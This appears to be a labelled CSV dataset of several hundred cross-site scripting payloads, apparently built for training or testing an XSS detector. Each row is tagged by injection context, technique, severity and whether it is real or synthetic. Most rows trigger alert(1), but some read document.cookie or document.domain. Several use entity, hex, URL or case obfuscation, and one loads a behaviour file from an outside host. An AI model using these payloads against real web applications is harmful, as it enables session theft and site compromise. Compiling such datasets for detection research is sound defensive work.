payload,context,technique,severity,length,source
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onwebkitanimationend=""alert(1)""></figure>",event_handler,none,medium,103,real
"<div id=""95""><svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",tag_injection,none,low,96,real
"<param onmousemove=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,51,real
"<audio onmouseenter=""alert(1)"">AnonKryptiQuz</audio>",event_handler,none,medium,52,real
"<body oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
<footer id=x tabindex=1 onfocus=alert(1)></footer>,event_handler,none,medium,50,real
"<option oncut=""alert(1)"" contenteditable>AnonKryptiQuz</option>",event_handler,none,medium,63,real
"<dt onclick=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,61,real
"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>",event_handler,none,medium,101,real
"<xss draggable=""true"" ondrag=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,70,real
"<rp id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></rp>",event_handler,none,medium,80,real
"<kbd onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,67,real
"<svg onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,71,synthetic
"""><svg onload=console.log('XSS')>",tag_injection,synthetic,medium,33,synthetic
"<div draggable=""true"" contenteditable>drag me</div><custom tags ondragover=alert(1) contenteditable style=display:block>drop here</custom tags>",event_handler,none,medium,143,real
"<dt onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,79,real
"""><Svg onErrOr=ProMpt(1)>",tag_injection,synthetic,medium,25,synthetic
<svg onfocus=console.log(1)/>,tag_injection,synthetic,medium,29,synthetic
""" oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
"<shadow onmouseover=""alert(1)"">AnonKryptiQuz</shadow>",event_handler,none,medium,53,real
<svg on&#101;rror=prompt(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,52,synthetic
"<em onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,77,real
%22><svg onfocus=prompt(location.hash)>,tag_injection,synthetic,medium,39,synthetic
"""&amp;lt;img src=1 onerror=alert(1)&amp;gt;",event_handler,none,medium,43,real
"<menuitem onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</menuitem>",event_handler,none,medium,75,real
"' onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,58,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",event_handler,none,medium,101,real
"<slot draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,85,real
"<script>throw onerror=eval,name</script>",script_injection,restricted_chars,high,40,real
jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,js_uri,none,high,99,real
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1),generic,none,medium,52,real
<svg><details onload=alert(1)></details>,event_handler,none,medium,40,real
"<output draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</output>",event_handler,none,medium,65,real
"<style>@keyframes x{}</style><center style=""animation-name:x"" onanimationend=""alert(1)""></center>",event_handler,none,medium,97,real
"""><svg onclick=alert(document.domain)>",tag_injection,synthetic,medium,38,synthetic
"<style>@keyframes x{}</style><tfoot style=""animation-name:x"" onwebkitanimationend=""alert(1)""></tfoot>",event_handler,none,medium,101,real
""" ontoggle=confirm(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,51,synthetic
"<article onmousemove=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,55,real
%3Csvg onfocus=console.log(1)/%3E,tag_injection,synthetic,medium,33,synthetic
"<menu onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</menu>",event_handler,none,medium,81,real
Set.constructor`alert\x28document.domain\x29,dom_sink,none,low,44,real
<mark onpointermove=alert(1) style=display:block>AnonKryptiQuz</mark>,event_handler,none,medium,69,real
<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,event_handler,none,medium,72,real
"<sub onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,67,real
<strong onpointerenter=alert(1) style=display:block>AnonKryptiQuz</strong>,event_handler,none,medium,74,real
"<img/src=""xss.png""alt=""AnonKryptiQuz"">",tag_injection,none,low,38,real
<svg><frameset onload=alert(1)></frameset>,event_handler,none,medium,42,real
"<svg onmouseover=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"<video><source onerror=""javascript:alert(1)"">//INJECTX",event_handler,none,medium,54,real
<script>alert('AnonKryptiQuz');</script>,script_injection,none,medium,40,real
"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",script_injection,none,medium,237,real
"<rt onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,77,real
"""`'><script>\x0Ajavascript:alert(2855)</script>",script_injection,none,medium,47,real
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable style=display:block>drop here</font>",event_handler,none,medium,129,real
"""><svg onb&#101;gin=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,58,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>",event_handler,none,medium,182,real
<svg onerror=alert(%27XSS%27)/>,tag_injection,synthetic,medium,31,synthetic
j&#97;vascr	ipt:confirm(document.domain),js_uri,synthetic,medium,40,synthetic
&lt;BODY ONLOAD=alert('AnonKryptiQuz')&gt;,event_handler,none,medium,42,real
"<pre onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</pre>",event_handler,none,medium,67,real
"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",event_handler,none,medium,79,real
%22 onbegin=prompt(document.cookie) %22,attribute_escape,synthetic,medium,39,synthetic
"<picture onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,90,real
"<script>\u0061lert`String.fromCharCode(88,83,83)`</script>",script_injection,synthetic,medium,58,synthetic
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",event_handler,none,medium,158,real
<table onpointerleave=alert(1) style=display:block>AnonKryptiQuz</table>,event_handler,none,medium,72,real
<frameset onload=alert(123)>,event_handler,none,medium,28,real
<script>//\u0061lert(document.domain)</script>,script_injection,synthetic,medium,46,synthetic
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",event_handler,none,medium,103,real
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",event_handler,none,medium,103,real
"<th onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</th>",event_handler,none,medium,66,real
"""<svg onload=alert (1)> "" ;",event_handler,none,low,27,real
"<sup onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</sup>",event_handler,none,medium,62,real
%3Cscript%3E//alert(document.cookie)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
"<time onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,69,real
"<audio onmousemove=""alert(1)"">AnonKryptiQuz</audio>",event_handler,none,medium,51,real
"<style>:target {color:red;}</style><rp id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></rp>",event_handler,none,medium,108,real
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}},template_injection,encoding,high,82,real
"""><svg onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,53,synthetic
%3Csvg onfocus=console.log(document.cookie)/%3E,tag_injection,synthetic,medium,47,synthetic
"<rt onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,65,real
""" oNloAd=ProMpt(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,34,synthetic
"<kbd oncontextmenu=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,49,real
"<IMG+SRC=""jav&#x0A;ascript:alert(1);"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,38,real
javascript:alert(document.cookie),js_uri,synthetic,medium,33,synthetic
"<rtc draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</rtc>",event_handler,none,medium,59,real
"""><Svg onBegIn=ConFirM(dOcuMenT.cOokIe)>",tag_injection,synthetic,medium,40,synthetic
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",event_handler,none,medium,128,real
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></hgroup>",event_handler,none,low,114,real
<audio controls src=1 onfocusin=alert(1) autofocus>,event_handler,none,medium,51,real
<input onclick=attributes[0].value='`'+URL+'`'>,event_handler,restricted_chars,medium,47,real
"<footer onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",event_handler,none,medium,73,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdi>",event_handler,none,medium,176,real
<legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>,event_handler,none,medium,70,real
"""><svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,70,synthetic
<svg onmous&#101;&#101;nt&#101;r=prompt('XSS')>,tag_injection,synthetic,medium,47,synthetic
"<footer draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,70,real
<title onpointermove=alert(1) style=display:block>AnonKryptiQuz</title>,event_handler,none,medium,71,real
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,event_handler,none,medium,44,real
<div id=x tabindex=1 onfocus=alert(1)></div>,event_handler,none,medium,44,real
%3Cscript%3Eprompt(document.cookie)%3C/script%3E,script_injection,synthetic,medium,48,synthetic
<li onpointermove=alert(1) style=display:block>AnonKryptiQuz</li>,event_handler,none,medium,65,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""print()""></caption>",event_handler,none,low,183,real
"""><Svg onCliCk=ProMpt(loCatIon.haSh)>",tag_injection,synthetic,medium,37,synthetic
""" oNfoCus=coNfiRm('XSS') auTofOcuS=""",attribute_escape,synthetic,medium,36,synthetic
"<input onmousedown=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,51,real
<track id=x tabindex=1 onactivate=alert(1)></track>,event_handler,none,medium,51,real
"<label draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,63,real
"<section onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</section>",event_handler,none,medium,73,real
"<dd draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dd>",event_handler,none,medium,62,real
""" onfocus=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,45,synthetic
"<embed oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<hr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,67,real
"<strong><button popovertarget=""x"">click me</button><AnonKryptiQuz onbeforetoggle=""alert(document.domain)"" popover id=""x"">aaa</AnonKryptiQuz></strong>",event_handler,none,medium,149,real
"<a href=""#"" onclick=""jscript.compact:alert(1);"">test</a>
<a href=""#"" onclick=""JSCRIPT.COMPACT:alert(1);"">test</a>",attribute,event_handler,medium,113,real
<scRipT>cOnsOle.loG(1)</ScrIpt>,script_injection,synthetic,medium,31,synthetic
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,event_handler,none,medium,75,real
""";document.body.addEventListener(""DOMActivate"",confirm(1))//",dom_sink,none,medium,60,real
"<meter onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></meter>",event_handler,none,medium,283,real
"""><svg onfocus=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,57,synthetic
"<multicol onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,71,real
%27 ontoggle=prompt(document.cookie) %27,attribute_escape,synthetic,medium,40,synthetic
"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",event_handler,none,medium,126,real
"<pre onmouseleave=""alert(1)"">AnonKryptiQuz</pre>",event_handler,none,medium,48,real
"""><script+src=""https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert""></script>",script_injection,none,low,106,real
""" oNmoUseEntEr=ProMpt(1) """,attribute_escape,synthetic,medium,26,synthetic
"<img onload=alert(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,50,synthetic
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",generic,html_entity,low,177,real
"<noscript onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noscript>",event_handler,none,medium,69,real
"<menu oncontextmenu=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,51,real
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,78,synthetic
"<style>@keyframes x{}</style><command style=""animation-name:x"" onwebkitanimationend=""alert(1)""></command>",event_handler,none,medium,105,real
"<scRipT>pRomPt`StrIng.frOmCHarCodE(88,83,83)`</sCriPt>",script_injection,synthetic,medium,54,synthetic
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=print()></thead>",event_handler,none,low,112,real
"<animatetransform onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,105,real
<svg onfocus=alert(1) autofocus tabindex=1>,event_handler,none,medium,43,real
"<multicol draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</multicol>",event_handler,none,medium,74,real
%22><svg onbegin=alert(location.hash)>,tag_injection,synthetic,medium,38,synthetic
<hgroup onpointermove=alert(1) style=display:block>AnonKryptiQuz</hgroup>,event_handler,none,medium,73,real
"<body onPageShow body onPageShow=""javascript:javascript:alert(5797)""></body onPageShow>",event_handler,none,medium,87,real
"</ foo=""><script>alert(91)</script>"">",script_injection,none,medium,37,real
"<section onmousemove=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,55,real
"%22><svg onclick=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
<input3 onpointerover=alert(1) style=display:block>AnonKryptiQuz</input3>,event_handler,none,medium,73,real
%22><svg onerror=confirm(location.hash)>,tag_injection,synthetic,medium,40,synthetic
%22><svg onmouseover=console.log(document.cookie)>,tag_injection,synthetic,medium,50,synthetic
"<datalist draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</datalist>",event_handler,none,medium,69,real
"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable style=display:block>drop here</spacer>",event_handler,none,medium,133,real
